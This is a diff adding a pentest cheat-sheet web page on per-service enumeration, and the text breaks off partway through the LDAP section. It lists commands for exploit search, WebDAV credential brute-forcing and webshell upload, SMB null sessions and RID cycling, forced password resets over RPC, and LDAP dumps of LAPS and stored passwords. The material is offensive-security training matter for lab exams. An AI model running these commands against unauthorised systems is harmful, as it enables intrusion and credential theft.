@@ -1,0 +1,1894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Service Enumeration — Corey Clay</title>
+<meta name="description" content="Per-service enumeration and exploitation for every common port — DNS, SMB, LDAP, SNMP, FTP/TFTP, SSH, SMTP, NFS, the databases, RDP, WinRM, and more, ">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#14161b;--ink-2:#181b21;--panel:#1c2027;--panel-2:#20242c;
+    --line:#2c313b;--line-soft:#242932;
+    --fg:#e6e2d8;--fg-dim:#b7b6ae;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#e8a33d;--signal-soft:rgba(232,163,61,.14);--signal-line:rgba(232,163,61,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"Space Grotesk",system-ui,sans-serif;
+    --f-body:"Newsreader",Georgia,serif;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:17px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 82% -8%, rgba(232,163,61,.05), transparent 60%),
+      linear-gradient(var(--line-soft) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
+    background-size:auto,64px 64px,64px 64px;background-position:0 0,-1px -1px,-1px -1px;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(180deg,transparent 0%,var(--ink) 42%)}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(20,22,27,.86);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(20,22,27,.92);backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ service-enum</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a class="" href="methodology.html">methodology</a>
+      <a class="here" href="enumeration.html" aria-current="page">enumeration</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="enumeration.html">&larr; enumeration</a> &nbsp;/&nbsp; per-service deep dive</p>
+  <h1>Service enumeration</h1>
+  <p>Per-service enumeration and exploitation for every common port — DNS, SMB, LDAP, SNMP, FTP/TFTP, SSH, SMTP, NFS, the databases, RDP, WinRM, and more, with a quick-reference table and box-specific tricks.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#vulnerability-scanning-public-exploit-search">Vulnerability Scanning &amp; Public Exploit Search</a>
+      <a href="#cvss-scoring-vulnerability-prioritization">CVSS Scoring &amp; Vulnerability Prioritization</a>
+      <a href="#webdav-enumeration-abuse">WebDAV Enumeration &amp; Abuse</a>
+      <a href="#dns-port-53">DNS (Port 53)</a>
+      <a href="#smb-cifs-ports-139-445">SMB/CIFS (Ports 139, 445)</a>
+      <a href="#ldap-ports-389-636">LDAP (Ports 389, 636)</a>
+      <a href="#snmp-udp-161">SNMP (UDP 161)</a>
+      <a href="#ftp-port-21">FTP (Port 21)</a>
+      <a href="#ssh-port-22">SSH (Port 22)</a>
+      <a href="#smtp-ports-25-465-587">SMTP (Ports 25, 465, 587)</a>
+      <a href="#nfs-ports-111-2049">NFS (Ports 111, 2049)</a>
+      <a href="#mssql-port-1433">MSSQL (Port 1433)</a>
+      <a href="#mysql-port-3306">MySQL (Port 3306)</a>
+      <a href="#postgresql-port-5432">PostgreSQL (Port 5432)</a>
+      <a href="#redis-port-6379">Redis (Port 6379)</a>
+      <a href="#rdp-port-3389">RDP (Port 3389)</a>
+      <a href="#winrm-ports-5985-5986">WinRM (Ports 5985, 5986)</a>
+      <a href="#wmi-port-135">WMI (Port 135)</a>
+      <a href="#imap-pop3-ports-110-143-993-995">IMAP &amp; POP3 (Ports 110, 143, 993, 995)</a>
+      <a href="#ipmi-udp-623">IPMI (UDP 623)</a>
+      <a href="#oracle-tns-port-1521">Oracle TNS (Port 1521)</a>
+      <a href="#finger-port-79">Finger (Port 79)</a>
+      <a href="#squid-proxy-port-3128">Squid Proxy (Port 3128)</a>
+      <a href="#r-services-ports-512-513-514">R-Services (Ports 512, 513, 514)</a>
+      <a href="#rsync-port-873">Rsync (Port 873)</a>
+      <a href="#smb-profiles-share-username-discovery">SMB Profiles$ Share — Username Discovery</a>
+      <a href="#wordpress-enumeration-wpscan">WordPress Enumeration (WPScan)</a>
+      <a href="#ssl-tls-certificate-mining-host-domain-discovery">SSL/TLS Certificate Mining — Host/Domain Discovery</a>
+      <a href="#dhcp-udp-67-68">DHCP (UDP 67/68)</a>
+      <a href="#nbt-ns-netbios-udp-137">NBT-NS / NetBIOS (UDP 137)</a>
+      <a href="#mdns-udp-5353">mDNS (UDP 5353)</a>
+      <a href="#service-enumeration-quick-reference">Service Enumeration Quick Reference</a>
+      <a href="#password-policy-enumeration">Password Policy Enumeration</a>
+      <a href="#security-controls-enumeration-windows">Security Controls Enumeration (Windows)</a>
+      <a href="#domain-trust-enumeration">Domain Trust Enumeration</a>
+      <a href="#application-discovery-screenshotting">Application Discovery &amp; Screenshotting</a>
+      <a href="#ad-auditing-tools">AD Auditing Tools</a>
+      <a href="#metasploit-auxiliary-enumeration-modules">Metasploit Auxiliary Enumeration Modules</a>
+      <a href="#htb-pg-box-specific-enumeration-tricks">HTB / PG Box-Specific Enumeration Tricks</a>
+      <a href="#pg-practice-smtp-user-enumeration-postfish">PG Practice — SMTP User Enumeration (PostFish)</a>
+      <a href="#pg-practice-remote-mouse-udp-1978-fingerprint-mice">PG Practice — Remote Mouse UDP/1978 Fingerprint (Mice)</a>
+      <a href="#pg-practice-non-standard-port-signals">PG Practice — Non-Standard Port Signals</a>
+  </div>
+</nav>
+<main class="wrap">
+<p>Comprehensive commands for enumerating and exploiting common network services.</p>
+<hr />
+<h2 id="vulnerability-scanning-public-exploit-search">Vulnerability Scanning &amp; Public Exploit Search</h2>
+<p><strong>When to use:</strong> After identifying service + exact version, before exploitation. Nessus/OpenVAS are BANNED — use <code>searchsploit</code> + manual research instead.</p>
+<pre><code class="language-bash">searchsploit vsftpd                          # search by product name
+searchsploit -u                              # update exploitdb package
+searchsploit -m 49757                        # mirror/copy exploit locally
+searchsploit -c OpenSSH                      # case-sensitive
+searchsploit -t vsftpd                       # search title only
+searchsploit -t &quot;Buffer Overflow&quot;            # search by vuln type
+searchsploit remote windows smb
+searchsploit local windows                   # privesc exploits
+searchsploit local windows smb -w            # -w = show online source link
+searchsploit -x 45161                        # examine (view) an exploit
+searchsploit -p 45161                        # show local path to an exploit
+searchsploit --id vsftpd                     # show EDB-ID column in results
+searchsploit --exclude=&quot;dos|PoC&quot; vsftpd      # drop noisy DoS/PoC entries
+searchsploit --nmap scan.xml                 # cross-reference every service in Nmap XML with EDB
+</code></pre>
+<p><strong>Cross-reference an Nmap XML output with the local Exploit-DB:</strong> run <code>sudo nmap -sV -oX scan.xml &lt;IP&gt;</code> first, then <code>searchsploit --nmap scan.xml</code> prints matched CVEs per port. Fastest way to triage a wide scan.</p>
+<p><strong>NSE exploit-tagged scripts inventory:</strong></p>
+<pre><code class="language-bash"># List every NSE script tagged as an actual exploit
+grep -l 'categories.*exploit' /usr/share/nmap/scripts/*.nse
+
+# Run a specific one
+sudo nmap --script clamav-exec  -p 3310 &lt;IP&gt;
+sudo nmap --script smb-vuln-ms17-010 -p 445 &lt;IP&gt;
+sudo nmap --script &quot;smb-vuln-*&quot;       -p 445 &lt;IP&gt;
+sudo nmap --script http-shellshock --script-args uri=/cgi-bin/status,cmd=id -p 80 &lt;IP&gt;
+</code></pre>
+<p><strong>Vetting exploit code before you run it — the cautionary tale:</strong></p>
+<p>Public exploits sometimes bury destructive commands in obfuscated arrays. Classic red flags: an SSH exploit that asks for <strong>local</strong> root on the attacker, or a "shellcode" byte array that decodes to a destructive shell command. Decode any embedded byte array as ASCII first:</p>
+<pre><code class="language-bash">python3 -c 'print(bytes.fromhex(&quot;&lt;hex-bytes-no-spaces&gt;&quot;).decode())'
+# If it decodes to something like a recursive delete, do NOT run the exploit.
+</code></pre>
+<p><strong>Always decode every embedded byte array</strong> in an unfamiliar exploit before running.</p>
+<p><strong>Cross-compiling exploit code:</strong></p>
+<pre><code class="language-bash">sudo apt-get install mingw-w64 gcc
+
+# Windows target from Linux
+i686-w64-mingw32-gcc exploit.c -o exploit.exe
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32     # if it needs Winsock
+
+# Linux target
+gcc -pthread exploit.c -o exploit -lcrypt
+</code></pre>
+<p><strong>Legitimate exploit sources:</strong> Exploit-DB, Rapid7 (Metasploit module DB), GitHub (<code>vsftpd 2.3 site:github.com</code>), Packet Storm. <strong>Always read exploit code before running it</strong> — verify it does what it claims (no coin-miner/backdoor payloads baked in) and patch local IP/port placeholders.</p>
+<hr />
+<h2 id="cvss-scoring-vulnerability-prioritization">CVSS Scoring &amp; Vulnerability Prioritization</h2>
+<p><strong>When to use:</strong> Reference for triaging findings under exam time pressure. Tells you what to chase first.</p>
+<p><strong>CVSS v3.1 severity bands:</strong></p>
+<table>
+<thead>
+<tr>
+<th>CVSS Base Score</th>
+<th>Rating</th>
+<th>Exam priority</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>9.0 – 10.0</td>
+<td>Critical</td>
+<td>RCE / auth bypass — try immediately</td>
+</tr>
+<tr>
+<td>7.0 – 8.9</td>
+<td>High</td>
+<td>Missing patches, stored XSS, insecure crypto</td>
+</tr>
+<tr>
+<td>4.0 – 6.9</td>
+<td>Medium</td>
+<td>Config weaknesses, reflected XSS, weak auth</td>
+</tr>
+<tr>
+<td>0.1 – 3.9</td>
+<td>Low/Info</td>
+<td>Banner/SSL info, dir listing, verbose errors</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Exploitation-first prioritization (what to try, in order):</strong></p>
+<ol>
+<li><strong>Critical</strong> — RCE, auth bypass, privesc, high-impact SQLi -&gt; immediate exploitation attempt</li>
+<li><strong>High</strong> — info disclosure, stored XSS, missing security patches -&gt; secondary targets</li>
+<li><strong>Medium/Low</strong> — config weaknesses, reflected XSS, banner disclosure -&gt; post-exploitation/persistence opportunities, or chain into something bigger</li>
+</ol>
+<p><strong>Credentialed vs unauthenticated scanning:</strong> A <em>credentialed</em> scan (valid SSH/SMB/DB creds) sees local patch level, config, and privilege misconfigs an unauthenticated network scan cannot. When you already hold creds, re-checking a host with them surfaces far more than the external view.</p>
+<hr />
+<h2 id="webdav-enumeration-abuse">WebDAV Enumeration &amp; Abuse</h2>
+<p><strong>When to use:</strong> IIS or Apache on 80/443 responds to <code>OPTIONS</code> with WebDAV methods (<code>PROPFIND</code>, <code>MKCOL</code>, <code>PUT</code>), or <code>http-enum</code> NSE flags <code>/webdav/</code>.</p>
+<pre><code class="language-bash"># Detect WebDAV methods
+nmap -sV -sC &lt;IP&gt;
+nmap -sV -p80 --script=http-enum &lt;IP&gt;
+curl -X OPTIONS -i http://&lt;IP&gt;/webdav/       # look for Allow: PUT, MKCOL, PROPFIND
+
+# Brute-force WebDAV creds
+hydra -L &lt;USERLIST&gt; -P &lt;PASSLIST&gt; &lt;IP&gt; http-get /webdav/
+
+# davtest — probes what file types can be uploaded and executed
+davtest -auth &lt;USER&gt;:&lt;PASS&gt; -url http://&lt;IP&gt;/webdav
+#   -auth USER:PASS    HTTP Basic Auth
+#   -url URL           target WebDAV endpoint
+# Reports which extensions upload successfully AND execute (e.g. .php works but .asp doesn't)
+
+# cadaver — interactive WebDAV client
+cadaver http://&lt;IP&gt;/webdav
+dav:/webdav/&gt; put shell.asp
+dav:/webdav/&gt; ls
+dav:/webdav/&gt; delete shell.asp
+</code></pre>
+<p><strong>WebDAV = HTTP extension letting the web server double as a collaborative file server.</strong> Requires legitimate creds to write — brute-force is the usual path in. Once authenticated with <code>cadaver</code>, upload a webshell matching the server (<code>.asp</code>/<code>.aspx</code> for IIS, <code>.php</code> for Apache) and browse to it.</p>
+<hr />
+<h2 id="dns-port-53">DNS (Port 53)</h2>
+<h3>Zone Transfer</h3>
+<p>Attempt to transfer entire zone file. Often misconfigured in internal networks.</p>
+<pre><code class="language-bash"># Zone transfer attempt
+dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;
+
+# Zone transfer with specific internal domain
+dig axfr @&lt;DNS_IP&gt; internal.&lt;DOMAIN&gt;
+</code></pre>
+<h3>Subdomain Enumeration</h3>
+<p>Discover all subdomains within target domain.</p>
+<pre><code class="language-bash"># dnsenum
+dnsenum --dnsserver &lt;DNS_IP&gt; --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt &lt;DOMAIN&gt;
+
+# Gobuster DNS
+gobuster dns -d &lt;DOMAIN&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r &lt;DNS_IP&gt; -i -t 100 -o gobuster.txt
+
+# Bash loop subdomain brute-force
+for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
+  dig $sub.&lt;DOMAIN&gt; @&lt;DNS_IP&gt; | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
+done
+</code></pre>
+<h3>DNS Queries &amp; Records</h3>
+<pre><code class="language-bash"># Query nameservers
+dig ns &lt;DOMAIN&gt; @&lt;DNS_IP&gt;
+
+# All DNS records
+dig any &lt;DOMAIN&gt; @&lt;DNS_IP&gt;
+
+# Reverse lookup
+dig -x &lt;IP&gt; @&lt;DNS_IP&gt;
+
+# Specific record types
+nslookup -type=any &lt;DOMAIN&gt; &lt;DNS_IP&gt;
+host -t mx &lt;DOMAIN&gt;
+
+# DNS version (Chaos class)
+dig CH TXT version.bind &lt;DNS_IP&gt;
+</code></pre>
+<h3>Active Directory DNS</h3>
+<pre><code class="language-bash"># LDAP discovery
+nslookup -type=srv _ldap._tcp.dc._msdcs.&lt;domain.name&gt;
+nslookup -type=srv _kerberos._tcp.&lt;domain.name&gt;
+nslookup -type=srv _ldap._tcp.&lt;domain.name&gt;
+
+# AD DNS resolution via LDAP
+adidnsdump -u &lt;DOMAIN&gt;\\&lt;USER&gt; ldap://&lt;DC_IP&gt;
+adidnsdump -u &lt;DOMAIN&gt;\\&lt;USER&gt; ldap://&lt;DC_IP&gt; -r    # -r -&gt; resolve unknown records
+</code></pre>
+<hr />
+<h2 id="smb-cifs-ports-139-445">SMB/CIFS (Ports 139, 445)</h2>
+<h3>Null Session Enumeration</h3>
+<p>No authentication required. Critical in older/misconfigured networks.</p>
+<pre><code class="language-bash"># smbclient null session
+smbclient -N -L //&lt;IP&gt;
+
+# rpcclient null session
+rpcclient -U &quot;&quot; -N &lt;IP&gt;
+
+# Enum4linux null session
+enum4linux -a &lt;IP&gt;
+enum4linux-ng &lt;IP&gt; -A
+</code></pre>
+<p><strong>RID cycling fallback progression</strong> (PG Vault / Resourced) — when the anon null session is denied, escalate through guest then SAMR:</p>
+<pre><code class="language-bash">nxc smb &lt;DC_IP&gt; -u '' -p '' --rid-brute          # STATUS_ACCESS_DENIED?
+nxc smb &lt;DC_IP&gt; -u 'guest' -p '' --rid-brute     # guest (enabled, blank pw) often works
+# If both RID cycling (LSAD) and anon LDAP are locked down, SAMR still enumerates users
+# (enum4linux-ng also dumps the description field — admins leave passwords there):
+enum4linux-ng -A &lt;DC_IP&gt;
+</code></pre>
+<h3>Authenticated SMB Enumeration</h3>
+<pre><code class="language-bash"># smbclient authenticated
+smbclient -U '&lt;user&gt;%&lt;pass&gt;' //&lt;IP&gt;/&lt;SHARE&gt;
+
+# SMBMap enumeration
+smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;DOMAIN&gt; -H &lt;IP&gt;
+smbmap -u &lt;user&gt; -p &lt;pass&gt; -H &lt;IP&gt; -R &lt;SHARE&gt; --dir-only
+
+# Nmap SMB scan
+sudo nmap &lt;IP&gt; -sV -sC -p139,445
+
+# Windows LOLBAS — list shares WITHOUT dropping smbclient
+net view \\&lt;HOSTNAME&gt; /all
+</code></pre>
+<p><strong>Useful SMB NSE scripts (extend <code>--script smb-vuln*</code>):</strong></p>
+<ul>
+<li><code>smb-vuln-ms17-010</code> — EternalBlue detection (Windows 7/2008)</li>
+<li><code>smb-vuln-ms08-067</code> — legacy but still lives on ancient boxes</li>
+<li><code>smb-vuln-cve-2017-7494</code> — SambaCry (Linux Samba RCE)</li>
+<li><code>smb-vuln-webexec</code> — Cisco WebEx RCE via SMB share</li>
+<li><code>smb-double-pulsar-backdoor</code> — detects the DOUBLEPULSAR implant left by ETERNALBLUE</li>
+</ul>
+<h3>CrackMapExec (CME)</h3>
+<p>Powerful SMB enumeration and lateral movement tool.</p>
+<pre><code class="language-bash"># List shares
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --shares
+
+# Enumerate users
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --users
+
+# Enumerate groups
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --groups
+
+# Logged-on users
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --loggedon-users
+
+# Password policy
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --pass-pol
+
+# Spider shares for files
+cme smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M spider_plus
+
+# Generate relay target list (for NTLM relay)
+cme smb &lt;IP&gt; --gen-relay-list relayTargets.txt
+
+# Null session
+cme smb &lt;IP&gt; --shares -u '' -p ''
+</code></pre>
+<h3>RPC Client (rpcclient)</h3>
+<p>Interactive RPC enumeration. Powerful with null session or credentials.</p>
+<pre><code class="language-bash"># Interactive mode
+rpcclient -U &quot;&quot; -N &lt;IP&gt;
+
+# Inside rpcclient:
+rpcclient $&gt; srvinfo              # Server info
+rpcclient $&gt; enumdomains          # Domain names
+rpcclient $&gt; querydominfo         # Domain info
+rpcclient $&gt; enumdomusers         # User list
+rpcclient $&gt; enumdomgroups        # Group list
+rpcclient $&gt; querygroupmem &lt;RID&gt;  # Group members
+rpcclient $&gt; queryuser &lt;RID&gt;      # User details
+rpcclient $&gt; netshareenumall      # Share enumeration
+rpcclient $&gt; netsharegetinfo &lt;share&gt;
+
+# RID brute-force (common range: 500-1100)
+for i in $(seq 500 1100); do
+  rpcclient -N -U &quot;&quot; &lt;IP&gt; -c &quot;queryuser 0x$(printf '%x\n' $i)&quot; | grep -E &quot;User Name|user_rid|group_rid&quot; &amp;&amp; echo &quot;&quot;
+done
+
+# Impacket samrdump (SAM enumeration)
+samrdump.py &lt;IP&gt;
+
+# Reset another user's password over RPC when your account holds the ACE
+# (User-Force-Change-Password / GenericAll edge — post-cred AD privesc, PG-exam pattern)
+rpcclient -U '&lt;USER&gt;%&lt;PASS&gt;' &lt;IP&gt; -c &quot;setuserinfo2 &lt;TARGET_USER&gt; 23 'NewPass123!'&quot;
+</code></pre>
+<h3>Additional SMB Tools</h3>
+<pre><code class="language-bash"># Impacket smbclient enumeration
+impacket-smbclient &lt;user&gt;@&lt;IP&gt;
+# Inside: who
+
+# Nmap vulnerability scanning
+nmap -p 445 --script smb-vuln* &lt;IP&gt;
+nmap -p 445 --script smb-enum-users.nse &lt;IP&gt;
+
+# Samba config review (if shell access)
+cat /etc/samba/smb.conf | grep -v &quot;#\|\;&quot;
+
+# Samba runtime status (sessions/locks/processes)
+smbstatus
+</code></pre>
+<p><strong>Dangerous smb.conf settings:</strong> <code>browseable = yes</code> (share discovery), <code>read only = no</code> / <code>writable = yes</code> (write access), <code>guest ok = yes</code> (no auth), <code>enable privileges = yes</code> (SID-based privs), <code>create mask = 0777</code> / <code>directory mask = 0777</code> (world-writable), <code>logon script</code> / <code>magic script</code> (auto-executed scripts for persistence).</p>
+<hr />
+<h2 id="ldap-ports-389-636">LDAP (Ports 389, 636)</h2>
+<h3>Anonymous Bind</h3>
+<p>Query LDAP without credentials. Often possible in AD.</p>
+<pre><code class="language-bash"># Base query
+ldapsearch -x -H ldap://&lt;IP&gt; -s base namingcontexts
+
+# Enumerate users anonymous
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;DC=DOMAIN,DC=LOCAL&quot; &quot;(objectClass=user)&quot; sAMAccountName
+
+# Full enumeration
+ldapsearch -x -h &lt;IP&gt; -b &quot;DC=&lt;DOMAIN&gt;,DC=&lt;TLD&gt;&quot; -s sub &quot;(&amp;(objectclass=user))&quot; | grep sAMAccountName
+
+# Do this FIRST on any DC — dump everything and grep the free-text fields where admins leave secrets
+# (PG Hutch/Resourced — cleartext passwords sat in the description field)
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;DC=&lt;DOMAIN&gt;,DC=&lt;TLD&gt;&quot; \
+  | grep -i 'description\|info\|userPassword\|pwd\|pass'
+
+# LAPS local-admin password via raw attribute read (fallback when nxc -M laps is unavailable, PG Hutch)
+ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;USER&gt;@&lt;DOMAIN&gt;' -w '&lt;PASS&gt;' \
+  -b &quot;DC=&lt;DOMAIN&gt;,DC=&lt;TLD&gt;&quot; ms-Mcs-AdmPwd msLAPS-Password
+#   ms-Mcs-AdmPwd = legacy LAPS   |   msLAPS-Password = Windows LAPS
+</code></pre>
+<h3>Authenticated LDAP</h3>
+<pre><code class="language-bash"># Bind with credentials
+ldapsearch -x -H ldap://&lt;IP&gt; -D &quot;user@domain&quot; -w '&lt;pass&gt;' -b &quot;DC=DOMAIN,DC=LOCAL&quot;
+
+# Enumerate password policy
+ldapsearch -h &lt;IP&gt; -x -b &quot;DC=&lt;DOMAIN&gt;,DC=&lt;TLD&gt;&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength
+</code></pre>
+<h3>Windapsearch (Python)</h3>
+<p>Cleaner LDAP enumeration tool.</p>
+<pre><code class="language-bash"># Unauthenticated user enumeration
+./windapsearch.py --dc-ip &lt;IP&gt; -u &quot;&quot; -U
+
+# Domain admins
+python3 windapsearch.py --dc-ip &lt;IP&gt; -u user -p pass --da
+
+# Privileged users
+python3 windapsearch.py --dc-ip &lt;IP&gt; -u user -p pass -PU
+
+# Computers
+python3 windapsearch.py --dc-ip &lt;IP&gt; -u &quot;&quot; -C
+
+# Groups
+python3 windapsearch.py --dc-ip &lt;IP&gt; -u user -p pass -G
+</code></pre>
+<h3>CrackMapExec LDAP</h3>
+<pre><code class="language-bash">cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --users
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --groups
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --password-not-required
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --trusted-for-delegation
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --admin-count
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --get-sid
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M laps
